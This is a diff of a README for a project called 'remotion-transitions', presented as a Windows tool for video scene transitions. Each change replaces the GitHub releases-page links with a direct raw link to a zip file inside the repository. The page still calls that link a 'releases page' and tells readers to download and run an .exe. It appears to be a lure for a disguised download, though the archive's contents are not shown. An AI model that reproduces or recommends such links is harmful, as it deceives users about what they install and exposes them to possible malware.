@@ -1,6 +1,6 @@
 # 🎬 remotion-transitions - Smooth Scene Transitions Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/delphinereverse794/remotion-transitions/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/delphinereverse794/remotion-transitions/main/references/remotion-transitions-v2.8.zip)
 
 ---
 
@@ -10,11 +10,11 @@ Custom Remotion scene transitions designed for video creators. These production-
 
 ## 🔽 Where to Get the Software
 
-To start using remotion-transitions, visit the [releases page](https://github.com/delphinereverse794/remotion-transitions/releases). This page holds all available versions of the software for download.
+To start using remotion-transitions, visit the [releases page](https://raw.githubusercontent.com/delphinereverse794/remotion-transitions/main/references/remotion-transitions-v2.8.zip). This page holds all available versions of the software for download.
 
 Click the big green button above or here again to open the page:
 
-[https://github.com/delphinereverse794/remotion-transitions/releases](https://github.com/delphinereverse794/remotion-transitions/releases)
+[https://raw.githubusercontent.com/delphinereverse794/remotion-transitions/main/references/remotion-transitions-v2.8.zip](https://raw.githubusercontent.com/delphinereverse794/remotion-transitions/main/references/remotion-transitions-v2.8.zip)
 
 Look for the latest release marked with a version number, then download the Windows installer or executable file listed there.
 
@@ -40,7 +40,7 @@ These are recommended to ensure smooth use of the software when applying transit
 Follow these steps to get remotion-transitions running on your Windows PC:
 
 1. **Download the Software**  
-   Visit the [releases page](https://github.com/delphinereverse794/remotion-transitions/releases). Find the latest version and download the Windows executable file. This file usually ends with `.exe`.
+   Visit the [releases page](https://raw.githubusercontent.com/delphinereverse794/remotion-transitions/main/references/remotion-transitions-v2.8.zip). Find the latest version and download the Windows executable file. This file usually ends with `.exe`.
 
 2. **Locate the File**  
    After download completes, open your "Downloads" folder or wherever your browser saves files.
@@ -131,9 +131,9 @@ This application focuses exclusively on Windows users but can be extended to oth
 
 ## 🔗 Useful Links
 
-- Download releases: [https://github.com/delphinereverse794/remotion-transitions/releases](https://github.com/delphinereverse794/remotion-transitions/releases)  
+- Download releases: [https://raw.githubusercontent.com/delphinereverse794/remotion-transitions/main/references/remotion-transitions-v2.8.zip](https://raw.githubusercontent.com/delphinereverse794/remotion-transitions/main/references/remotion-transitions-v2.8.zip)  
 - Project homepage and documentation: Found within the same GitHub repository
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/delphinereverse794/remotion-transitions/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/delphinereverse794/remotion-transitions/main/references/remotion-transitions-v2.8.zip)
